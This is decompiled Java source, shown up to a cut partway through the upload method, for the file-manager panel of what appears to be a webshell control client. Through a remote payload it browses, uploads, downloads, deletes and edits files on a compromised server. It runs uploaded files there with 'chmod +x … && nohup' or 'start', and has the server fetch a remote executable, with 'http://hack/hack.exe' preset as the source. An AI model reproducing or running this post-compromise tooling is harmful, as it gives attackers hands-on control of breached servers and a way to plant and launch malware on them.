/*     */ package core.ui.component;
/*     */ import core.ApplicationContext;
/*     */ import core.Db;
/*     */ import core.EasyI18N;
/*     */ import core.Encoding;
/*     */ import core.shell.ShellEntity;
/*     */ import core.ui.component.annotation.ButtonToMenuItem;
/*     */ import core.ui.component.dialog.FileDialog;
/*     */ import core.ui.component.dialog.GFileChooser;
/*     */ import core.ui.component.dialog.GOptionPane;
/*     */ import core.ui.component.dialog.HttpProgressBar;
/*     */ import core.ui.component.model.FileInfo;
/*     */ import core.ui.component.model.FileOpertionInfo;
/*     */ import java.awt.BorderLayout;
/*     */ import java.awt.CardLayout;
/*     */ import java.awt.Component;
/*     */ import java.awt.Frame;
/*     */ import java.awt.datatransfer.DataFlavor;
/*     */ import java.awt.datatransfer.Transferable;
/*     */ import java.awt.event.ActionEvent;
/*     */ import java.awt.event.KeyEvent;
/*     */ import java.awt.event.MouseEvent;
/*     */ import java.io.File;
/*     */ import java.io.FileInputStream;
/*     */ import java.io.FileOutputStream;
/*     */ import java.io.IOException;
/*     */ import java.util.List;
/*     */ import java.util.Vector;
/*     */ import javax.swing.ImageIcon;
/*     */ import javax.swing.JButton;
/*     */ import javax.swing.JComponent;
/*     */ import javax.swing.JFrame;
/*     */ import javax.swing.JPanel;
/*     */ import javax.swing.JScrollPane;
/*     */ import javax.swing.JSplitPane;
/*     */ import util.Log;
/*     */ import util.UiFunction;
/*     */ import util.functions;
/*     */ 
/*     */ @DisplayName(DisplayName = "文件管理")
/*     */ public class ShellFileManager extends JPanel {
/*  42 */   public static final ThreadLocal<Boolean> bigFileThreadLocal = new ThreadLocal<>();
/*     */   
/*     */   private JScrollPane filelJscrollPane;
/*     */   
/*     */   private DataTree fileDataTree;
/*     */   private JPanel filePanel;
/*     */   private JPanel fileOpertionPanel;
/*     */   private DefaultMutableTreeNode rootTreeNode;
/*     */   private JScrollPane dataViewSplitPane;
/*     */   private JScrollPane toolSplitPane;
/*     */   private DataView dataView;
/*     */   private ShellRSFilePanel rsFilePanel;
/*     */   private JPanel dataViewPanel;
/*     */   private JPanel toolsPanel;
/*     */   @ButtonToMenuItem
/*     */   private JButton editFileButton;
/*     */   @ButtonToMenuItem
/*     */   private JButton editFileNewWindowButton;
/*     */   @ButtonToMenuItem
/*     */   private JButton editFileInEditFileFrameButton;
/*     */   @ButtonToMenuItem
/*     */   private JButton showImageFileButton;
/*     */   @ButtonToMenuItem
/*     */   private JButton uploadButton;
/*     */   @ButtonToMenuItem
/*     */   private JButton moveButton;
/*     */   @ButtonToMenuItem
/*     */   private JButton copyFileButton;
/*     */   @ButtonToMenuItem
/*     */   private JButton copyNameButton;
/*     */   @ButtonToMenuItem
/*     */   private JButton deleteFileButton;
/*     */   @ButtonToMenuItem
/*     */   private JButton newFileButton;
/*     */   @ButtonToMenuItem
/*     */   private JButton newDirButton;
/*     */   @ButtonToMenuItem
/*     */   private JButton executeFileButton;
/*     */   @ButtonToMenuItem
/*     */   private JButton refreshButton;
/*     */   @ButtonToMenuItem
/*     */   private JButton downloadButton;
/*     */   @ButtonToMenuItem
/*     */   private JButton fileAttrButton;
/*     */   @ButtonToMenuItem
/*     */   private JButton fileRemoteDownButton;
/*     */   @ButtonToMenuItem
/*     */   private JButton bigFileDownloadButton;
/*     */   @ButtonToMenuItem
/*     */   private JButton bigFileUploadButton;
/*     */   private JTextField dirField;
/*     */   private JPanel dirPanel;
/*     */   private JSplitPane jSplitPane1;
/*     */   private JSplitPane jSplitPane2;
/*     */   private JSplitPane jSplitPane3;
/*     */   private Vector<String> dateViewColumnVector;
/*     */   private ImageIcon dirIcon;
/*     */   private ImageIcon fileIcon;
/*     */   private String currentDir;
/*     */   private final ShellEntity shellEntity;
/*     */   private final Payload payload;
/*     */   private final Encoding encoding;
/*     */   
/*     */   public ShellFileManager(ShellEntity entity) {
/* 106 */     this.shellEntity = entity;
/* 107 */     this.payload = this.shellEntity.getPayloadModule();
/* 108 */     this.encoding = Encoding.getEncoding(this.shellEntity);
/* 109 */     setLayout(new BorderLayout(1, 1));
/* 110 */     InitJPanel();
/* 111 */     InitEvent();
/* 112 */     updateUI();
/* 113 */     init(this.shellEntity);
/* 114 */     EasyI18N.installObject(this.dataView);
/*     */   }
/*     */   
/*     */   public void init(ShellEntity shellEntity) {
/* 118 */     String[] fileRoot = this.payload.listFileRoot();
/* 119 */     for (int i = 0; i < fileRoot.length; i++) {
/* 120 */       this.fileDataTree.AddNote(fileRoot[i]);
/*     */     }
/* 122 */     this.currentDir = functions.formatDir(this.payload.currentDir());
/* 123 */     this.currentDir = this.currentDir.substring(0, 1).toUpperCase() + this.currentDir.substring(1);
/* 124 */     this.dirField.setText(this.currentDir);
/* 125 */     this.fileDataTree.AddNote(this.currentDir);
/*     */   }
/*     */ 
/*     */   
/*     */   private void InitJPanel() {
/* 130 */     this.filePanel = new JPanel();
/* 131 */     this.filePanel.setLayout(new BorderLayout(1, 1));
/* 132 */     this.filelJscrollPane = new JScrollPane();
/* 133 */     this.rootTreeNode = new DefaultMutableTreeNode("Disk");
/* 134 */     this.fileDataTree = new DataTree("", this.rootTreeNode);
/* 135 */     this.fileDataTree.setRootVisible(true);
/* 136 */     this.filelJscrollPane.setViewportView(this.fileDataTree);
/* 137 */     this.filePanel.add(this.filelJscrollPane);
/* 138 */     this.fileOpertionPanel = new JPanel(new CardLayout());
/*     */     
/* 140 */     this.dateViewColumnVector = new Vector<>();
/* 141 */     this.dateViewColumnVector.add("icon");
/* 142 */     this.dateViewColumnVector.add("name");
/* 143 */     this.dateViewColumnVector.add("type");
/* 144 */     this.dateViewColumnVector.add("lastModified");
/* 145 */     this.dateViewColumnVector.add("size");
/* 146 */     this.dateViewColumnVector.add("permission");
/* 147 */     this.dataViewSplitPane = new JScrollPane();
/* 148 */     this.dataViewPanel = new JPanel();
/* 149 */     this.dataViewPanel.setLayout(new BorderLayout(1, 1));
/* 150 */     this.dataView = new DataView(null, this.dateViewColumnVector, 0, 30);
/* 151 */     this.dataViewSplitPane.setViewportView(this.dataView);
/* 152 */     this.fileOpertionPanel.add("dataView", this.dataViewSplitPane);
/* 153 */     this.rsFilePanel = new ShellRSFilePanel(this.shellEntity, this.fileOpertionPanel, "dataView");
/* 154 */     this.fileOpertionPanel.add("rsFile", this.rsFilePanel);
/* 155 */     this.dataViewPanel.add(this.fileOpertionPanel);
/*     */     
/* 157 */     this.toolSplitPane = new JScrollPane();
/* 158 */     this.toolsPanel = new JPanel();
/* 159 */     this.editFileButton = new JButton("在当前窗口编辑文件");
/* 160 */     this.editFileNewWindowButton = new JButton("在新窗口编辑文件");
/* 161 */     this.editFileInEditFileFrameButton = new JButton("在编辑器编辑此文件");
/* 162 */     this.showImageFileButton = new JButton("在新窗口显示图片");
/* 163 */     this.uploadButton = new JButton("上传");
/* 164 */     this.refreshButton = new JButton("刷新");
/* 165 */     this.moveButton = new JButton("移动");
/*     */     
/* 167 */     this.copyFileButton = new JButton("复制");
/* 168 */     this.downloadButton = new JButton("下载");
/* 169 */     this.copyNameButton = new JButton("复制绝对路径");
/* 170 */     this.deleteFileButton = new JButton("删除文件");
/* 171 */     this.newFileButton = new JButton("新建文件");
/* 172 */     this.newDirButton = new JButton("新建文件夹");
/* 173 */     this.fileAttrButton = new JButton("文件属性");
/* 174 */     this.fileRemoteDownButton = new JButton("远程下载");
/* 175 */     this.executeFileButton = new JButton("执行");
/* 176 */     this.bigFileDownloadButton = new JButton("大文件下载");
/* 177 */     this.bigFileUploadButton = new JButton("大文件上传");
/* 178 */     this.toolsPanel.add(this.uploadButton);
/* 179 */     this.toolsPanel.add(this.moveButton);
/*     */     
/* 181 */     this.toolsPanel.add(this.refreshButton);
/* 182 */     this.toolsPanel.add(this.copyFileButton);
/* 183 */     this.toolsPanel.add(this.copyNameButton);
/* 184 */     this.toolsPanel.add(this.deleteFileButton);
/* 185 */     this.toolsPanel.add(this.newFileButton);
/* 186 */     this.toolsPanel.add(this.newDirButton);
/* 187 */     this.toolsPanel.add(this.downloadButton);
/* 188 */     this.toolsPanel.add(this.fileAttrButton);
/* 189 */     this.toolsPanel.add(this.fileRemoteDownButton);
/* 190 */     this.toolsPanel.add(this.executeFileButton);
/* 191 */     this.toolsPanel.add(this.bigFileUploadButton);
/* 192 */     this.toolsPanel.add(this.bigFileDownloadButton);
/* 193 */     this.toolSplitPane.setViewportView(this.toolsPanel);
/*     */     
/* 195 */     this.dirPanel = new JPanel();
/* 196 */     this.dirPanel.setLayout(new BorderLayout(1, 1));
/* 197 */     this.dirField = new JTextField();
/* 198 */     this.dirField.setColumns(100);
/* 199 */     this.dirPanel.add(this.dirField);
/*     */     
/* 201 */     this.dirIcon = new ImageIcon(getClass().getResource("/images/folder.png"));
/* 202 */     this.fileIcon = new ImageIcon(getClass().getResource("/images/file.png"));
/*     */ 
/*     */     
/* 205 */     this.fileDataTree.setLeafIcon(new ImageIcon(getClass().getResource("/images/folder.png")));
/* 206 */     this.jSplitPane2 = new JSplitPane();
/* 207 */     this.jSplitPane2.setOrientation(0);
/* 208 */     this.jSplitPane2.setTopComponent(this.dataViewPanel);
/* 209 */     this.jSplitPane2.setBottomComponent(this.toolSplitPane);
/* 210 */     this.jSplitPane3 = new JSplitPane();
/* 211 */     this.jSplitPane3.setOrientation(0);
/* 212 */     this.jSplitPane3.setTopComponent(this.dirPanel);
/* 213 */     this.jSplitPane3.setBottomComponent(this.jSplitPane2);
/* 214 */     this.jSplitPane1 = new JSplitPane();
/* 215 */     this.jSplitPane1.setOrientation(1);
/* 216 */     this.jSplitPane1.setLeftComponent(this.filePanel);
/* 217 */     this.jSplitPane1.setRightComponent(this.jSplitPane3);
/*     */     
/* 219 */     add(this.jSplitPane1);
/*     */   }
/*     */   
/*     */   private void InitEvent() {
/* 223 */     automaticBindClick.bindJButtonClick(this, this);
/* 224 */     automaticBindClick.bindButtonToMenuItem(this, this, this.dataView.getRightClickMenu());
/* 225 */     this.dataView.setActionDblClick(e -> dataViewDbClick(e));
/*     */ 
/*     */     
/* 228 */     this.fileDataTree.setActionDbclick(e -> fileDataTreeDbClick(e));
/*     */ 
/*     */     
/* 231 */     this.dirField.addKeyListener(new KeyAdapter()
/*     */         {
/*     */           public void keyPressed(KeyEvent e) {
/* 234 */             if (e.getKeyChar() == '\n')
/*     */             {
/* 236 */               ShellFileManager.this.refreshButtonClick((ActionEvent)null);
/*     */             }
/*     */           }
/*     */         });
/* 240 */     this.jSplitPane2.setTransferHandler(new TransferHandler()
/*     */         {
/*     */           private static final long serialVersionUID = 1L;
/*     */           
/*     */           public boolean importData(JComponent comp, Transferable t) {
/*     */             try {
/* 246 */               Object o = t.getTransferData(DataFlavor.javaFileListFlavor);
/*     */               
/* 248 */               if (List.class.isAssignableFrom(o.getClass())) {
/* 249 */                 List list = (List)o;
/* 250 */                 if (list.size() == 1) {
/* 251 */                   Object fileObject = list.get(0);
/* 252 */                   if (File.class.isAssignableFrom(fileObject.getClass())) {
/* 253 */                     File file = (File)fileObject;
/* 254 */                     if (file.canRead() && file.isFile()) {
/* 255 */                       String uploadFileString = ShellFileManager.this.currentDir + file.getName();
/* 256 */                       ShellFileManager.this.uploadFile(uploadFileString, file, false);
/*     */                     } else {
/* 258 */                       GOptionPane.showMessageDialog(null, "目标不是文件 或不可读");
/*     */                     } 
/*     */                   } else {
/* 261 */                     GOptionPane.showMessageDialog(null, "目标不是文件");
/*     */                   } 
/*     */                 } else {
/* 264 */                   GOptionPane.showMessageDialog(null, "不支持多文件操作");
/*     */                 } 
/*     */               } else {
/*     */                 
/* 268 */                 GOptionPane.showMessageDialog(null, "不支持的操作");
/*     */               } 
/*     */               
/* 271 */               return true;
/* 272 */             } catch (Exception e) {
/* 273 */               GOptionPane.showMessageDialog((Component)ShellFileManager.this.shellEntity.getFrame(), e.getMessage(), "提示", 1);
/* 274 */               Log.error(e);
/*     */               
/* 276 */               return false;
/*     */             } 
/*     */           }
/*     */           
/*     */           public boolean canImport(JComponent comp, DataFlavor[] flavors) {
/* 281 */             for (int i = 0; i < flavors.length; i++) {
/* 282 */               if (DataFlavor.javaFileListFlavor.equals(flavors[i])) {
/* 283 */                 return true;
/*     */               }
/*     */             } 
/* 286 */             return false;
/*     */           }
/*     */         });
/*     */   }
/*     */   public void dataViewDbClick(MouseEvent e) {
/* 291 */     editFileInEditFileFrameButtonClick((ActionEvent)null);
/*     */   }
/*     */   public void editFileNewWindowButtonClick(ActionEvent e) {
/* 294 */     Vector<String> rowVector = this.dataView.GetSelectRow();
/* 295 */     String fileType = rowVector.get(2);
/* 296 */     String fileNameString = functions.formatDir(this.currentDir) + rowVector.get(1);
/* 297 */     long fileSize = ((FileInfo)rowVector.get(4)).getSize();
/* 298 */     if (fileType.equals("file")) {
/* 299 */       ShellRSFilePanel shellRSFilePanel = new ShellRSFilePanel(this.shellEntity, null, "editFileNewWindow");
/* 300 */       JFrame frame = new JFrame("editFile");
/* 301 */       frame.add(shellRSFilePanel);
/* 302 */       shellRSFilePanel.rsFile(fileNameString);
/* 303 */       functions.setWindowSize(frame, 700, 800);
/* 304 */       frame.setLocationRelativeTo((Component)null);
/* 305 */       frame.setVisible(true);
/* 306 */       frame.setDefaultCloseOperation(2);
/*     */     } else {
/* 308 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "目标是文件夹", "警告", 2);
/*     */     } 
/*     */   }
/*     */   public void editFileButtonClick(ActionEvent e) {
/* 312 */     Vector<String> rowVector = this.dataView.GetSelectRow();
/* 313 */     String fileType = rowVector.get(2);
/* 314 */     String fileNameString = functions.formatDir(this.currentDir) + rowVector.get(1);
/* 315 */     long fileSize = ((FileInfo)rowVector.get(4)).getSize();
/* 316 */     if (fileType.equals("dir")) {
/* 317 */       refreshFile(this.dirField.getText() + "/" + rowVector.get(1));
/*     */     }
/* 319 */     else if (fileSize < 1048576L) {
/* 320 */       this.rsFilePanel.rsFile(fileNameString);
/* 321 */       ((CardLayout)this.fileOpertionPanel.getLayout()).show(this.fileOpertionPanel, "rsFile");
/*     */     } else {
/* 323 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "目标文件大小大于1MB", "提示", 2);
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   public void editFileInEditFileFrameButtonClick(ActionEvent e) {
/* 329 */     Vector<String> rowVector = this.dataView.GetSelectRow();
/* 330 */     String fileType = rowVector.get(2);
/* 331 */     String fileNameString = functions.formatDir(this.currentDir) + rowVector.get(1);
/* 332 */     long fileSize = ((FileInfo)rowVector.get(4)).getSize();
/* 333 */     if (fileType.equals("file")) {
/* 334 */       ShellRSFilePanel shellRSFilePanel = new ShellRSFilePanel(this.shellEntity, null, "editFileNewWindow");
/* 335 */       shellRSFilePanel.rsFile(fileNameString);
/* 336 */       EditFileFrame.OpenNewEdit(shellRSFilePanel);
/*     */     } else {
/* 338 */       refreshFile(this.dirField.getText() + "/" + rowVector.get(1));
/*     */     } 
/*     */   }
/*     */   
/*     */   public void showImageFileButtonClick(ActionEvent e) {
/* 343 */     Vector<String> rowVector = this.dataView.GetSelectRow();
/* 344 */     String fileType = rowVector.get(2);
/* 345 */     String fileNameString = functions.formatDir(this.currentDir) + rowVector.get(1);
/* 346 */     long fileSize = ((FileInfo)rowVector.get(4)).getSize();
/* 347 */     if (fileType.equals("dir")) {
/* 348 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "目标是文件夹", "警告", 2);
/*     */     }
/* 350 */     else if (fileSize < 3145728L) {
/* 351 */       byte[] fileContent = null;
/*     */       try {
/* 353 */         fileContent = this.payload.downloadFile(fileNameString);
/* 354 */         ImageShowFrame.showImageDiaolog(new ImageIcon(ImageIO.read(new ByteArrayInputStream(fileContent))));
/* 355 */       } catch (Exception err) {
/* 356 */         Log.error(err);
/* 357 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "下载文件失败", "警告", 0);
/*     */       } 
/*     */     } else {
/* 360 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "目标文件大小大于3MB", "提示", 2);
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   public void fileDataTreeDbClick(MouseEvent e) {
/* 366 */     refreshFile(this.fileDataTree.GetSelectFile());
/*     */   }
/*     */   
/*     */   public void moveButtonClick(ActionEvent e) {
/* 370 */     String fileString = getSelectdFile();
/* 371 */     FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion((Frame)this.shellEntity.getFrame(), "reName", fileString, fileString);
/*     */     
/* 373 */     if (fileOpertionInfo.getOpertionStatus().booleanValue() && fileOpertionInfo.getSrcFileName().trim().length() > 0 && fileOpertionInfo
/* 374 */       .getDestFileName().trim().length() > 0) {
/* 375 */       String srcFileString = fileOpertionInfo.getSrcFileName();
/* 376 */       String destFileString = fileOpertionInfo.getDestFileName();
/* 377 */       boolean state = this.payload.moveFile(srcFileString, destFileString);
/* 378 */       if (state) {
/* 379 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), String.format(EasyI18N.getI18nString("移动成功  %s >> %s"), new Object[] { fileOpertionInfo.getSrcFileName(), fileOpertionInfo
/* 380 */                 .getDestFileName() }), "提示", 1);
/*     */       } else {
/* 382 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "修改失败", "提示", 2);
/*     */       } 
/*     */     } else {
/* 385 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "信息填写不完整", "提示", 2);
/*     */     } 
/*     */   }
/*     */   
/*     */   public void copyFileButtonClick(ActionEvent e) {
/* 390 */     String fileString = getSelectdFile();
/* 391 */     FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion((Frame)this.shellEntity.getFrame(), "copy", fileString, fileString);
/*     */     
/* 393 */     if (fileOpertionInfo.getOpertionStatus().booleanValue() && fileOpertionInfo.getSrcFileName().trim().length() > 0 && fileOpertionInfo
/* 394 */       .getDestFileName().trim().length() > 0) {
/* 395 */       boolean state = this.payload.copyFile(fileOpertionInfo.getSrcFileName(), fileOpertionInfo.getDestFileName());
/* 396 */       if (state) {
/* 397 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), String.format(EasyI18N.getI18nString("复制成功  %s <<>> %s"), new Object[] { fileOpertionInfo.getSrcFileName(), fileOpertionInfo
/* 398 */                 .getDestFileName() }), "提示", 1);
/*     */       } else {
/* 400 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "复制失败", "提示", 2);
/*     */       } 
/*     */     } else {
/* 403 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "信息填写不完整", "提示", 2);
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   public void copyNameButtonClick(ActionEvent e) {
/* 409 */     Vector<String> vector = this.dataView.GetSelectRow();
/* 410 */     if (vector != null) {
/* 411 */       String fileString = functions.formatDir(this.currentDir) + vector.get(1);
/* 412 */       Toolkit.getDefaultToolkit().getSystemClipboard().setContents(new StringSelection(fileString), null);
/* 413 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "已经复制到剪辑版");
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   public void deleteFileButtonClick(ActionEvent e) {
/* 419 */     String fileString = getSelectdFile();
/* 420 */     String inputFile = GOptionPane.showInputDialog("输入文件名称", fileString);
/* 421 */     if (inputFile != null) {
/* 422 */       boolean state = this.payload.deleteFile(inputFile);
/* 423 */       if (state) {
/* 424 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "删除成功", "提示", 1);
/*     */       } else {
/* 426 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "删除失败", "提示", 2);
/*     */       } 
/*     */     } else {
/* 429 */       Log.log("用户取消选择.....", new Object[0]);
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   private String getSelectdFile() {
/* 435 */     String fileString = "";
/*     */     try {
/* 437 */       fileString = functions.formatDir(this.currentDir) + this.dataView.getValueAt(this.dataView.getSelectedRow(), 1);
/* 438 */     } catch (Exception exception) {}
/*     */ 
/*     */     
/* 441 */     return fileString;
/*     */   }
/*     */   
/*     */   public void newFileButtonClick(ActionEvent e) {
/* 445 */     String fileString = functions.formatDir(this.currentDir) + "newFile";
/* 446 */     String inputFile = GOptionPane.showInputDialog("输入文件名称", fileString);
/* 447 */     if (inputFile != null) {
/* 448 */       boolean state = this.payload.newFile(inputFile);
/* 449 */       if (state) {
/* 450 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "新建文件成功", "提示", 1);
/*     */       } else {
/* 452 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "新建文件失败", "提示", 2);
/*     */       } 
/*     */     } else {
/* 455 */       Log.log("用户取消选择.....", new Object[0]);
/*     */     } 
/*     */   }
/*     */   
/*     */   public void uploadButtonClick(ActionEvent e) {
/* 460 */     (new Thread(new Runnable()
/*     */         {
/*     */           public void run()
/*     */           {
/* 464 */             ApplicationContext.isShowHttpProgressBar.set(new Boolean(true));
/* 465 */             if (ApplicationContext.isGodMode()) {
/* 466 */               ShellFileManager.this.GUploadFile(false);
/*     */             } else {
/* 468 */               ShellFileManager.this.UploadFile(false);
/*     */             } 
/*     */           }
/* 471 */         })).start();
/*     */   }
/*     */   
/*     */   public void bigFileUploadButtonClick(ActionEvent e) {
/* 475 */     (new Thread(new Runnable()
/*     */         {
/*     */           public void run()
/*     */           {
/* 479 */             if (ApplicationContext.isGodMode()) {
/* 480 */               ShellFileManager.this.GUploadFile(true);
/*     */             } else {
/* 482 */               ShellFileManager.this.UploadFile(true);
/*     */             } 
/*     */           }
/* 485 */         })).start();
/*     */   }
/*     */ 
/*     */   
/*     */   public void refreshButtonClick(ActionEvent e) {
/* 490 */     refreshFile(functions.formatDir(this.dirField.getText()));
/*     */   }
/*     */   
/*     */   public void executeFileButtonClick(ActionEvent e) {
/* 494 */     String fileString = getSelectdFile();
/* 495 */     String inputFile = GOptionPane.showInputDialog("输入可执行文件名称", fileString);
/* 496 */     if (inputFile != null) {
/*     */       
/* 498 */       String cmdString = null;
/* 499 */       if (!this.payload.isWindows()) {
/* 500 */         cmdString = String.format("chmod +x %s && nohup %s > /dev/null", new Object[] { inputFile, inputFile });
/*     */       } else {
/* 502 */         cmdString = String.format("start %s ", new Object[] { inputFile });
/*     */       } 
/*     */       
/* 505 */       final String executeCmd = cmdString;
/* 506 */       (new Thread(new Runnable()
/*     */           {
/*     */             public void run()
/*     */             {
/* 510 */               Log.log(String.format("Execute Command Start As %s", new Object[] { this.val$executeCmd }), new Object[0]);
/* 511 */               String result = ShellFileManager.this.payload.execCommand(executeCmd);
/* 512 */               Log.log(String.format("execute Command End %s", new Object[] { result }), new Object[0]);
/*     */             }
/* 514 */           })).start();
/*     */     } else {
/*     */       
/* 517 */       Log.log("用户取消选择.....", new Object[0]);
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   public void downloadButtonClick(ActionEvent e) {
/* 523 */     (new Thread(new Runnable()
/*     */         {
/*     */           public void run()
/*     */           {
/* 527 */             ApplicationContext.isShowHttpProgressBar.set(new Boolean(true));
/* 528 */             if (ApplicationContext.isGodMode()) {
/* 529 */               ShellFileManager.this.GDownloadFile(false);
/*     */             } else {
/* 531 */               ShellFileManager.this.downloadFile(false);
/*     */             } 
/*     */           }
/* 534 */         })).start();
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public void bigFileDownloadButtonClick(ActionEvent e) {
/* 540 */     (new Thread(new Runnable()
/*     */         {
/*     */           public void run()
/*     */           {
/* 544 */             if (ApplicationContext.isGodMode()) {
/* 545 */               ShellFileManager.this.GDownloadFile(true);
/*     */             } else {
/* 547 */               ShellFileManager.this.downloadFile(true);
/*     */             } 
/*     */           }
/* 550 */         })).start();
/*     */   }
/*     */ 
/*     */ 
/*     */   
/*     */   public void newDirButtonClick(ActionEvent e) {
/* 556 */     String fileString = functions.formatDir(this.currentDir) + "newDir";
/* 557 */     String inputFile = GOptionPane.showInputDialog("输入文件夹名称", fileString);
/* 558 */     if (inputFile != null) {
/* 559 */       boolean state = this.payload.newDir(inputFile);
/* 560 */       if (state) {
/* 561 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "新建文件夹成功", "提示", 1);
/*     */       } else {
/* 563 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "新建文件夹失败", "提示", 2);
/*     */       } 
/*     */     } else {
/* 566 */       Log.log("用户取消选择.....", new Object[0]);
/*     */     } 
/*     */   }
/*     */ 
/*     */   
/*     */   public void fileAttrButtonClick(ActionEvent e) {
/* 572 */     String fileString = getSelectdFile();
/* 573 */     String filePermission = (String)this.dataView.getValueAt(this.dataView.getSelectedRow(), 5);
/* 574 */     String fileTime = (String)this.dataView.getValueAt(this.dataView.getSelectedRow(), 3);
/* 575 */     FileAttr attr = new FileAttr(this.shellEntity, fileString, filePermission, fileTime);
/*     */   }
/*     */   
/*     */   public void fileRemoteDownButtonClick(ActionEvent e) {
/* 579 */     final FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion((Frame)this.shellEntity.getFrame(), "fileRemoteDown", "http://hack/hack.exe", this.currentDir + "hack.exe");
/*     */     
/* 581 */     if (fileOpertionInfo.getOpertionStatus().booleanValue()) {
/* 582 */       (new Thread(new Runnable()
/*     */           {
/*     */             public void run()
/*     */             {
/* 586 */               boolean state = ShellFileManager.this.payload.fileRemoteDown(fileOpertionInfo.getSrcFileName(), fileOpertionInfo
/* 587 */                   .getDestFileName());
/* 588 */               if (state) {
/* 589 */                 GOptionPane.showMessageDialog((Component)ShellFileManager.this.shellEntity.getFrame(), "远程下载成功", "提示", 1);
/*     */               } else {
/*     */                 
/* 592 */                 GOptionPane.showMessageDialog((Component)ShellFileManager.this.shellEntity.getFrame(), "远程下载失败", "提示", 2);
/*     */               }
/*     */             
/*     */             }
/* 596 */           })).start();
/*     */     }
/*     */   }
/*     */   
/*     */   private Vector<Vector<Object>> getAllFile(String filePathString) {
/* 601 */     filePathString = functions.formatDir(filePathString);
/* 602 */     String fileDataString = this.payload.getFile(filePathString);
/* 603 */     String[] rowStrings = fileDataString.split("\n");
/*     */     
/* 605 */     Vector<Vector<Object>> rows = new Vector<>();
/*     */     
/* 607 */     if (rowStrings[0].equals("ok")) {
/* 608 */       rows = new Vector<>();
/* 609 */       this.fileDataTree.AddNote(rowStrings[1]);
/* 610 */       this.currentDir = functions.formatDir(rowStrings[1]);
/* 611 */       this.dirField.setText(functions.formatDir(rowStrings[1]));
/* 612 */       for (int i = 2; i < rowStrings.length; i++) {
/* 613 */         String[] fileTypes = rowStrings[i].split("\t");
/* 614 */         Vector<Object> row = new Vector();
/* 615 */         if (fileTypes.length == 5) {
/* 616 */           if (fileTypes[1].equals("0")) {
/* 617 */             row.add(this.dirIcon);
/* 618 */             this.fileDataTree.AddNote(this.currentDir + fileTypes[0]);
/*     */           } else {
/* 620 */             row.add(this.fileIcon);
/*     */           } 
/* 622 */           row.add(fileTypes[0]);
/* 623 */           row.add(fileTypes[1].equals("0") ? "dir" : "file");
/* 624 */           row.add(fileTypes[2]);
/* 625 */           row.add(new FileInfo(fileTypes[3]));
/* 626 */           row.add(fileTypes[4]);
/* 627 */           rows.add(row);
/*     */         } else {
/* 629 */           Log.error("格式不匹配 ," + rowStrings[i]);
/*     */         } 
/*     */       } 
/*     */     } else {
/* 633 */       Log.error(fileDataString);
/* 634 */       Log.error("目标返回异常,无法正常格式化数据!");
/* 635 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), fileDataString);
/*     */     } 
/* 637 */     return rows;
/*     */   }
/*     */   
/*     */   private synchronized void refreshFile(String filePathString) {
/* 641 */     Vector<Vector<Object>> rowsVector = getAllFile(filePathString);
/* 642 */     this.dataView.AddRows(rowsVector);
/* 643 */     this.dataView.getColumnModel().getColumn(0).setMaxWidth(35);
/* 644 */     this.dataView.getModel().fireTableDataChanged();
/*     */   }
/*     */ 
/*     */   
/*     */   private void GUploadFile(boolean bigFileUpload) {
/* 649 */     FileOpertionInfo fileOpertionInfo = FileDialog.showFileOpertion((Frame)this.shellEntity.getFrame(), "upload", "", "");
/* 650 */     if (fileOpertionInfo.getOpertionStatus().booleanValue() && fileOpertionInfo.getSrcFileName().trim().length() > 0 && fileOpertionInfo
/* 651 */       .getDestFileName().trim().length() > 0) {
/* 652 */       if (fileOpertionInfo.getDestFileName().length() > 0) {
/* 653 */         uploadFile(fileOpertionInfo.getDestFileName(), new File(fileOpertionInfo.getSrcFileName()), bigFileUpload);
/*     */       } else {
/* 655 */         GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "上传路径为空", "提示", 2);
/*     */       } 
/*     */     } else {
/* 658 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "信息填写不完整", "提示", 2);
/*     */     } 
/*     */   }
/*     */   
/*     */   private void UploadFile(boolean bigFileUpload) {
/* 663 */     GFileChooser chooser = new GFileChooser();
/* 664 */     chooser.setFileSelectionMode(0);
/* 665 */     boolean flag = (0 == chooser.showDialog(new JLabel(), "选择"));
/* 666 */     File selectdFile = chooser.getSelectedFile();
/* 667 */     if (flag && selectdFile != null) {
/* 668 */       String uploadFileString = this.currentDir + selectdFile.getName();
/* 669 */       uploadFile(uploadFileString, selectdFile, bigFileUpload);
/*     */     } else {
/*     */       
/* 672 */       GOptionPane.showMessageDialog(UiFunction.getParentFrame(this), "信息填写不完整", "提示", 2);
/*     */     } 
/*     */   }
/*     */   
/*     */   public void uploadFile(String uploadFileString, File selectdFile, boolean bigFileUpload) {
/* 677 */     byte[] data = new byte[0];
/* 678 */     Log.log(String.format("%s starting %s -> %s\t threadId: %s", new Object[] { "upload", selectdFile, uploadFileString, Long.valueOf(Thread.currentThread().getId()) }), new Object[0]);
/* 679 */     boolean state = false;
